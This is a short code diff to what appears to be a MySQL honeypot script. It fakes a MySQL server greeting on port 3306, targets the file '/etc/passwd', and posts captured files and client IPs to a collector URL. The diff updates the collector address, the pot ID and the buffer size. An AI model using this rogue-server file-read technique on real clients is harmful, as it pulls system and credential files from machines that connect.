@@ -3,15 +3,16 @@ import requests
 
 
 def sendAttackInfo(ip, file):
-    url = 'http://10.22.145.106/mysqlHoneyPot/'
-    data = {'ip': ip, 'file': file, 'potID': 2}
+    potID = socket.gethostname().split("Mysql")[1]
+    url = 'http://10.21.196.121/mysqlHoneyPot/'
+    data = {'ip': ip, 'file': file, 'potID': potID}
     requests.post(url, data)
 
 
 if __name__ == '__main__':
     HOST = "0.0.0.0"
     PORT = 3306
-    BUFFERSIZE = 1024
+    BUFFERSIZE = 10248
     filename = "/etc/passwd"
     length = (len(filename) + 1).to_bytes(length=1, byteorder='big')
     greeting = b"\x5b\x00\x00\x00\x0a" + bytes("5.7.34-0ubuntu0.18.04.2",
